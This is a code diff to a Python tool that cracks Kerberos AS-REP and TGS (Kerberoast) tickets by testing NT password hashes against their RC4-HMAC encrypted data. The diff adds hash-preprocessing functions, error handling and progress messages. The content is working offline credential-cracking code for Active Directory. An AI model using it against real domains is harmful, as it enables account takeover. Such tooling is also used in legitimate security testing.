@@ -4,29 +4,30 @@ from unicrypto.hashlib import md5 as MD5
 from tqdm import tqdm
 
 def crack_asrep(hashlist, tickets, total = 0):
+	print('Cracking ASREP tickets')
 	for asrep in tickets:
-		result = None
-		test = asrep.split('$')
-		etype = test[2]
-		user,checksum  = test[3].split(':')
-		edata = test[4]
+		try:
+			result = None
+			test = asrep.split('$')
+			etype = test[2]
+			user,checksum  = test[3].split(':')
+			edata = test[4]
 
-		#print('Etype : %s' % etype)
-		#print('User  : %s' % user)
-		#print('Chksum: %s' % checksum)
-		#print('EData : %s...' % edata[:16])
+			#print('Etype : %s' % etype)
+			#print('User  : %s' % user)
+			#print('Chksum: %s' % checksum)
+			#print('EData : %s...' % edata[:16])
 
-		checksum = bytes.fromhex(checksum)
-		edata = bytes.fromhex(edata)
+			checksum = bytes.fromhex(checksum)
+			edata = bytes.fromhex(edata)
 
-		keyusage = 8
-		keyusage = keyusage.to_bytes(4, byteorder='little', signed=False)
+			keyusage = 8
+			keyusage = keyusage.to_bytes(4, byteorder='little', signed=False)
+		except Exception as e:
+			print('Error parsing ticket: %s' % e)
+			continue
 
-		for pwhash in tqdm(hashlist, total=total):
-			pwhash = pwhash.strip()
-			pwhash = bytes.fromhex(pwhash)
-
-			ki = HMAC.new(pwhash, keyusage, MD5).digest()
+		for pwhash, ki in hashlist:
 			ke = HMAC.new(ki, checksum, MD5).digest()
 			# at this point you can add some optimizations to make it faster,
 			# but honestly I don't think it's needed, it's Python so it will be slow anyhow
@@ -39,35 +40,60 @@ def crack_asrep(hashlist, tickets, total = 0):
 			continue
 		print('%s: %s' % (asrep, result.hex()))
 
+def preprocess_hashlist_asrep(hashlist):
+	print('Preprocessing hashlist for ASREP cracking...')
+	res = []
+	keyusage = 8
+	keyusage = keyusage.to_bytes(4, byteorder='little', signed=False)
+	for pwhash in hashlist:
+			pwhash = pwhash.strip()
+			pwhash = bytes.fromhex(pwhash)
+			ki = HMAC.new(pwhash, keyusage, MD5).digest()
+			res.append((pwhash, ki))
+	print('Preprocessing done!')
+	return res
 
+def preprocess_hashlist_tgs(hashlist):
+	print('Preprocessing hashlist for TGS cracking...')
+	res = []
+	keyusage = 2
+	keyusage = keyusage.to_bytes(4, byteorder='little', signed=False)
+	for pwhash in hashlist:
+			pwhash = pwhash.strip()
+			pwhash = bytes.fromhex(pwhash)
+			ki = HMAC.new(pwhash, keyusage, MD5).digest()
+			res.append((pwhash, ki))
+	print('Preprocessing done!')
+	return res
 
 def crack_tgs(hashlist, tickets, total = 0):
 	for tgs in tickets:
-		result = None
-		test = tgs.split('$')
-		etype = test[2]
-		user = test[3]
-		realm = test[4]
-		checksum = test[6]
-		edata = test[7]
+		try:
+			result = None
+			test = tgs.split('$')
+			etype = test[2]
+			user = test[3]
+			realm = test[4]
+			checksum = test[6]
+			edata = test[7]
 
-		#print('Etype : %s' % etype)
-		#print('User  : %s' % user)
-		#print('Realm : %s' % realm)
-		#print('Chksum: %s' % checksum)
-		#print('EData : %s...' % edata[:16])
+			#print('Etype : %s' % etype)
+			#print('User  : %s' % user)
+			#print('Realm : %s' % realm)
+			#print('Chksum: %s' % checksum)
+			#print('EData : %s...' % edata[:16])
 
-		checksum = bytes.fromhex(checksum)
-		edata = bytes.fromhex(edata)
+			checksum = bytes.fromhex(checksum)
+			edata = bytes.fromhex(edata)
 
-		keyusage = 2
-		keyusage = keyusage.to_bytes(4, byteorder='little', signed=False)
-
-		for pwhash in tqdm(hashlist, total=total):
-			pwhash = pwhash.strip()
-			pwhash = bytes.fromhex(pwhash)
-
-			ki = HMAC.new(pwhash, keyusage, MD5).digest()
+			keyusage = 2
+			keyusage = keyusage.to_bytes(4, byteorder='little', signed=False)
+		except Exception as e:
+			print('Error parsing ticket: %s' % e)
+			continue
+		
+		print('Cracking TGS for %s\\%s' % (realm, user))
+		for pwhash, ki in hashlist:
 			ke = HMAC.new(ki, checksum, MD5).digest()
 			# at this point you can add some optimizations to make it faster,
 			# but honestly I don't think it's needed
@@ -77,6 +103,7 @@ def crack_tgs(hashlist, tickets, total = 0):
 				result = pwhash
 				break
 		else:
+			print('No password found for %s\\%s' % (realm, user))
 			continue
 		print('%s: %s' % (tgs, result.hex()))
 
@@ -114,11 +141,18 @@ def crack(hashlist, tickets):
 				continue
 			total += 1
 	
+	if len(spntickets) == 0 and len(asreptickets) == 0:
+		print('No tickets loaded! Exiting!')
+		return
+	
 	with open(hashlist, 'r') as f:
 		if len(spntickets) > 0:
-			crack_tgs(f, spntickets, total=total)
+			hashlist = preprocess_hashlist_tgs(f)
+			crack_tgs(hashlist, spntickets, total=total)
 		if len(asreptickets) > 0:
-			crack_asrep(f, asreptickets, total=total)
+			f.seek(0)
+			hashlist = preprocess_hashlist_asrep(f)
+			crack_asrep(hashlist, asreptickets, total=total)
 
 
 def main():
